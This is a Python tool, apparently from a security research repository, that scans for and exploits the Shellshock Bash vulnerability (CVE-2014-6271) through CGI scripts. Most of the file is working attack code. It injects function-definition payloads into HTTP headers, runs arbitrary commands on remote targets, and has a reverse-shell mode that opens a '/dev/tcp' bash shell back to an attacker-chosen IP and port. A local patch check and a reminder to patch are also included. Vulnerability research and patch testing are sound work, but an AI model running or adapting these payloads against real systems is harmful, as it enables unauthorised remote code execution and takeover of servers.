#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2014-6271
# Original vulnerability discovered by StÃ©phane Chazelas
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
Shellshock (CVE-2014-6271) Bash Command Injection Scanner and Exploit

This tool tests for and exploits the Shellshock vulnerability in Bash.
The vulnerability allows arbitrary command execution through specially
crafted environment variables containing function definitions.

Affected versions:
- GNU Bash 1.14 through 4.3 (unpatched)
- All major Unix-like systems with vulnerable Bash

The exploit works by injecting malicious function definitions into
environment variables that are processed by Bash, causing arbitrary
command execution when the environment is processed.
"""

import argparse
import requests
import sys
import time
import threading
import urllib.parse
from urllib.parse import urljoin, urlparse
import re
import socket

# Common CGI paths to test
COMMON_CGI_PATHS = [
    '/cgi-bin/test.cgi',
    '/cgi-bin/test.sh',
    '/cgi-bin/hello.cgi',
    '/cgi-bin/printenv.cgi',
    '/cgi-bin/status',
    '/cgi-bin/admin.cgi',
    '/cgi-bin/test',
    '/test.cgi',
    '/status.cgi',
    '/admin.cgi',
    '/cgi-bin/formmail.cgi',
    '/cgi-bin/guestbook.cgi',
    '/cgi-bin/counter.cgi'
]

# Headers that commonly get passed to CGI as environment variables
INJECTABLE_HEADERS = [
    'User-Agent',
    'Referer', 
    'Cookie',
    'X-Forwarded-For',
    'X-Real-IP',
    'Accept',
    'Accept-Language',
    'Accept-Encoding',
    'Authorization'
]

def create_shellshock_payload(command="echo SHELLSHOCK_VULNERABLE"):
    """Create a Shellshock payload for the given command"""
    # Basic Shellshock payload format
    payload = f"() {{ :; }}; {command}"
    return payload

def create_detection_payload():
    """Create a payload that generates a unique identifier for detection"""
    import random
    import string
    
    # Generate random string for detection
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    command = f"echo SHELLSHOCK_{random_id}"
    return create_shellshock_payload(command), f"SHELLSHOCK_{random_id}"

def test_url_shellshock(url, timeout=10, proxy=None, verify_ssl=True):
    """Test a single URL for Shellshock vulnerability"""
    results = []
    
    # Create detection payload
    payload, detection_string = create_detection_payload()
    
    # Test each injectable header
    for header_name in INJECTABLE_HEADERS:
        try:
            headers = {header_name: payload}
            
            # Add some normal headers to avoid suspicion
            if header_name != 'User-Agent':
                headers['User-Agent'] = 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            
            response = requests.get(
                url, 
                headers=headers, 
                timeout=timeout,
                proxies=proxies,
                verify=verify_ssl,
                allow_redirects=True
            )
            
            # Check if our detection string appears in the response
            if detection_string in response.text:
                results.append({
                    'vulnerable': True,
                    'header': header_name,
                    'payload': payload,
                    'detection': detection_string,
                    'response_code': response.status_code,
                    'response_length': len(response.text)
                })
            
        except requests.exceptions.RequestException as e:
            # Connection error, timeout, etc.
            continue
    
    return results

def scan_cgi_paths(base_url, timeout=10, proxy=None, verify_ssl=True):
    """Scan common CGI paths on a target"""
    vulnerable_urls = []
    
    for path in COMMON_CGI_PATHS:
        url = urljoin(base_url, path)
        
        try:
            # First check if the path exists
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            response = requests.head(url, timeout=timeout, proxies=proxies, verify=verify_ssl)
            
            if response.status_code in [200, 500]:  # 500 might indicate CGI error
                # Test for Shellshock
                results = test_url_shellshock(url, timeout, proxy, verify_ssl)
                if results:
                    vulnerable_urls.append({'url': url, 'results': results})
                    
        except requests.exceptions.RequestException:
            continue
    
    return vulnerable_urls

def exploit_shellshock(url, command, header='User-Agent', timeout=10, proxy=None, verify_ssl=True):
    """Exploit Shellshock to execute a command"""
    payload = create_shellshock_payload(command)
    
    headers = {header: payload}
    if header != 'User-Agent':
        headers['User-Agent'] = 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
    
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        response = requests.get(
            url,
            headers=headers,
            timeout=timeout,
            proxies=proxies,
            verify=verify_ssl
        )
        
        return {
            'success': True,
            'status_code': response.status_code,
            'response': response.text,
            'headers': dict(response.headers)
        }
        
    except requests.exceptions.RequestException as e:
        return {
            'success': False,
            'error': str(e)
        }

def test_local_bash():
    """Test if local Bash is vulnerable to Shellshock"""
    import subprocess
    
    try:
        # Test command that should only output "test" if patched
        env = {'x': '() { :;}; echo vulnerable'}
        result = subprocess.run(
            ['bash', '-c', 'echo test'],
            env=env,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        output = result.stdout.strip()
        if 'vulnerable' in output:
            return True, output
        else:
            return False, output
            
    except Exception as e:
        return None, str(e)

def generate_reverse_shell_payload(ip, port):
    """Generate a reverse shell payload"""
    # Bash reverse shell
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return create_shellshock_payload(payload)

def main():
    parser = argparse.ArgumentParser(
        description='Shellshock (CVE-2014-6271) Scanner and Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py -t http://example.com/cgi-bin/test.cgi
  python exploit.py -t http://example.com --scan-cgi
  python exploit.py -f urls.txt -v
  python exploit.py --test-local
  python exploit.py -t http://example.com/test.cgi --exploit --cmd "whoami"
        """
    )
    
    parser.add_argument('-t', '--target', help='Target URL to test')
    parser.add_argument('-f', '--file', help='File containing list of URLs to test')
    parser.add_argument('--scan-cgi', action='store_true', help='Scan for common CGI paths')
    parser.add_argument('--test-local', action='store_true', help='Test local Bash for vulnerability')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (only show vulnerable targets)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--proxy', help='HTTP proxy (e.g., http://proxy:8080)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('-o', '--output', help='Save results to file')
    
    # Exploitation options
    exploit_group = parser.add_argument_group('exploitation options')
    exploit_group.add_argument('--exploit', action='store_true', help='Enable exploitation mode')
    exploit_group.add_argument('--cmd', help='Command to execute (requires --exploit)')
    exploit_group.add_argument('--reverse-shell', help='IP:PORT for reverse shell (requires --exploit)')
    exploit_group.add_argument('--header', default='User-Agent', help='HTTP header to inject payload (default: User-Agent)')
    
    args = parser.parse_args()
    
    # Test local Bash if requested
    if args.test_local:
        vulnerable, output = test_local_bash()
        if vulnerable is None:
            print(f"Error testing local Bash: {output}")
            return 1
        elif vulnerable:
            print("LOCAL BASH IS VULNERABLE TO SHELLSHOCK!")
            print(f"Test output: {output}")
            print("Please update Bash immediately.")
            return 1
        else:
            print("Local Bash appears to be patched against Shellshock.")
            print(f"Test output: {output}")
            return 0
    
    if not args.target and not args.file:
        parser.error('Must specify --target, --file, or --test-local')
    
    # Prepare targets list
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"Error reading file: {e}")
            return 1
    
    if not targets:
        print("No targets to test")
        return 1
    
    vulnerable_count = 0
    all_results = []
    
    for target in targets:
        if not args.quiet:
            print(f"Testing {target}...")
        
        target_results = []
        
        if args.scan_cgi:
            # Scan for CGI paths
            cgi_results = scan_cgi_paths(
                target, 
                timeout=args.timeout,
                proxy=args.proxy,
                verify_ssl=not args.no_ssl_verify
            )
            
            for cgi_result in cgi_results:
                target_results.extend(cgi_result['results'])
                if not args.quiet:
                    print(f"  [VULNERABLE] {cgi_result['url']}")
                    for result in cgi_result['results']:
                        print(f"    Header: {result['header']}")
                        if args.verbose:
                            print(f"    Payload: {result['payload']}")
                            print(f"    Detection: {result['detection']}")
        else:
            # Test single URL
            results = test_url_shellshock(
                target,
                timeout=args.timeout,
                proxy=args.proxy,
                verify_ssl=not args.no_ssl_verify
            )
            target_results = results
        
        if target_results:
            vulnerable_count += 1
            if not args.scan_cgi:  # Don't duplicate output
                print(f"[VULNERABLE] {target}")
                for result in target_results:
                    print(f"  Header: {result['header']}")
                    if args.verbose:
                        print(f"  Payload: {result['payload']}")
                        print(f"  Detection: {result['detection']}")
            
            # Exploitation mode
            if args.exploit:
                if args.cmd:
                    exploit_result = exploit_shellshock(
                        target,
                        args.cmd,
                        header=args.header,
                        timeout=args.timeout,
                        proxy=args.proxy,
                        verify_ssl=not args.no_ssl_verify
                    )
                    
                    if exploit_result['success']:
                        print(f"[EXPLOIT] Command executed successfully")
                        print(f"Response: {exploit_result['response']}")
                    else:
                        print(f"[EXPLOIT] Failed: {exploit_result['error']}")
                
                elif args.reverse_shell:
                    try:
                        ip, port = args.reverse_shell.split(':')
                        payload = generate_reverse_shell_payload(ip, int(port))
                        
                        print(f"[EXPLOIT] Attempting reverse shell to {ip}:{port}")
                        print(f"Make sure you have a listener running: nc -lvp {port}")
                        
                        exploit_result = exploit_shellshock(
                            target,
                            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                            header=args.header,
                            timeout=args.timeout,
                            proxy=args.proxy,
                            verify_ssl=not args.no_ssl_verify
                        )
                        
                        if exploit_result['success']:
                            print(f"[EXPLOIT] Reverse shell payload sent")
                        else:
                            print(f"[EXPLOIT] Failed: {exploit_result['error']}")
                            
                    except ValueError:
                        print("Invalid reverse shell format. Use IP:PORT")
        
        elif not args.quiet:
            print(f"[SAFE] {target} - Not vulnerable or not accessible")
        
        all_results.append({
            'target': target,
            'vulnerable': bool(target_results),
            'results': target_results
        })
    
    # Save results if requested
    if args.output:
        try:
            import json
            with open(args.output, 'w') as f:
                json.dump(all_results, f, indent=2)
            print(f"Results saved to {args.output}")
        except Exception as e:
            print(f"Error saving results: {e}")
    
    if not args.quiet:
        print(f"\nScan complete. Found {vulnerable_count} vulnerable targets out of {len(targets)} tested.")
        
        if vulnerable_count > 0:
            print("\nIMPORTANT: Vulnerable systems should be patched immediately!")
            print("Update Bash to the latest version and consider disabling CGI if not needed.")
    
    return 0 if vulnerable_count == 0 else 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        sys.exit(1)